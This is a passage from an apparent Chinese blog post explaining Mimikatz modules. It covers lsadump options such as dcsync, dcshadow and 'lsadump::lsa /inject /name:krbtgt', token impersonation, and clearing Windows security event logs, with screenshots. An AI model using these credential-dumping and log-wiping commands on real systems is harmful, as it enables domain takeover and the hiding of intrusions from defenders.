获取保存的密码凭据，可以直接获取明文密码。</td></tr><tr><td>cache</td><td>获取内存中的密码值</td></tr><tr><td>lsa</td><td>从 lsa 服务器获取密码，lsadump::lsa /inject /name:krbtgt</td></tr><tr><td>trust</td><td>要求LSA服务器检索信任验证信息（正常或fbackupkeys rpdata上的补丁程序）</td></tr><tr><td>dcsync</td><td>要求DC同步对象</td></tr><tr><td>dcshadow</td><td>他们告诉我我可以成为我想要的任何人，所以我成为了域控制器</td></tr><tr><td>setntlm</td><td>要求服务器为一个用户设置新密码/ ntlm</td></tr><tr><td>changentlm</td><td>要求服务器为一个用户设置新密码/ ntlm</td></tr><tr><td>netsync</td><td>要求DC发送DC / SRV / WKS的当前和以前的NTLM哈希</td></tr></tbody></table><blockquote><h3 id="ts-终端服务模块"><a href="#ts-终端服务模块" class="headerlink" title="ts 终端服务模块"></a>ts 终端服务模块</h3></blockquote><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>sessions</td><td>显示当前的会话</td></tr><tr><td>multirdp</td><td>允许多个用户使用 rdp，安装 rdp 补丁</td></tr></tbody></table><blockquote><h4 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a><strong>sessions</strong></h4></blockquote><p>该命令有点像<code>linux</code>上面的查看ssh终端有谁登录，上面时候登录，登录了多久一样</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/18.png?raw=true" alt="image-20200414223024341"></p><hr><blockquote><h4 id="multirdp"><a href="#multirdp" class="headerlink" title="multirdp"></a><strong>multirdp</strong></h4></blockquote><p>没有用过这个，站个坑后面会了在写</p><blockquote><h3 id="event-事件模块"><a href="#event-事件模块" class="headerlink" title="event 事件模块"></a>event 事件模块</h3></blockquote><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>drop</td><td>启用事件补丁服务，不再记录新产生的事件</td></tr><tr><td>clear</td><td>清除时间日志</td></tr></tbody></table><blockquote><h4 id="drop"><a href="#drop" class="headerlink" title="drop"></a><strong>drop</strong></h4></blockquote><p>没有用过这个，站个坑后面会了在写</p><hr><blockquote><h4 id="clear"><a href="#clear" class="headerlink" title="clear"></a><strong>clear</strong></h4></blockquote><p>清除日志</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/19.png?raw=true" alt="image-20200414223725607"></p><p>​        安全位置的日志全被清空了</p><p>​        <img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/20.png?raw=true" alt="image-20200414224028608"></p><blockquote><h3 id="misc-杂项模块"><a href="#misc-杂项模块" class="headerlink" title="misc 杂项模块"></a>misc 杂项模块</h3></blockquote><p>该模块就是一些打开文件的功能，比如说cmd、注册列表等等</p><blockquote><h3 id="token-令牌操作模块"><a href="#token-令牌操作模块" class="headerlink" title="token 令牌操作模块"></a>token 令牌操作模块</h3></blockquote><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>whoami</td><td>显示当前的身份</td></tr><tr><td>list</td><td>列出系统所有的令牌</td></tr><tr><td>elevate</td><td>冒充令牌</td></tr><tr><td>run</td><td>运行</td></tr><tr><td>revert</td><td>恢复到进程令牌</td></tr></tbody></table><blockquote><h3 id="vault-Windows-信任-凭证模块"><a href="#vault-Windows-信任-凭证模块" class="headerlink" title="vault  Windows 信任/凭证模块"></a>vault  Windows 信任/凭证模块</h3></blockquote><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>list</td><td>列出 Windows 信任/凭证</td></tr><tr><td>cred</td><td>未知</td></tr></tbody></table><blockquote><h3 id="net-显示信息"><a href="#net-显示信息" class="headerlink" title="net 显示信息"></a>net 显示信息</h3></blockquote><p>这个模块和<code>cmd</code>中的<code>net</code>命令类似就是显示一些user、group、alias、session、wsession、tod、stats、share、serverinfo 等信息</p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
</feed>
